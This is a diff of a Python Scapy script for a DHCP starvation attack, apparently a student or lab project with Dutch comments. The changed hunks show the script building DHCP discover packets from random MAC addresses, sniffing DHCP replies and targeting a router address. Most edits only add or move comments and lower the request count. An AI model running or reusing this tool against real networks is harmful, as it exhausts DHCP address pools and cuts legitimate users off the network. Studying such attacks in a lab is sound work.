@@ -13,9 +13,11 @@ class DhcpStarvationAttack:
         self.ip_starved = []
         self.dhcp_server = dhcp_server
         self.amount = amount
-        self.awaiting = False
+        self.awaiting = False  # zodat je geen requests spammed hoeft niet persee maar is iets omgeving vriendelijker
 
     def send_discover(self, requested_addr):
+
+        # Maakt en stuurt een DHCP dsicover package
 
         hwaddress = str(RandMAC())
 
@@ -23,7 +25,6 @@ class DhcpStarvationAttack:
             hwaddress = str(RandMAC())
         self.mac.append(hwaddress)
 
-        # generate DHCP discover packet
         ether_layer = Ether(src=hwaddress, dst="ff:ff:ff:ff:ff:ff")
         ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
         udp_layer = UDP(sport=68, dport=67)
@@ -41,9 +42,9 @@ class DhcpStarvationAttack:
 
         self.awaiting = True
 
+    def dhcp_sniffer(self):
         # luisterd naar DHCP responces
 
-    def dhcp_sniffer(self):
         sniff(filter="udp and (port 67 or port 68)", prn=self.handler_dhcp,
               store=0)
 
@@ -111,8 +112,9 @@ class DhcpStarvationAttack:
 
 
 if __name__ == '__main__':
+    # zet hier gwn je DHCP SERVER neer sinds dat Address altijd geclaimd is krijg je iets anders uit het netwerk
     target = '192.168.1.1'
-    number = 20
+    number = 2
 
     test = DhcpStarvationAttack(target, number)
     test.run()
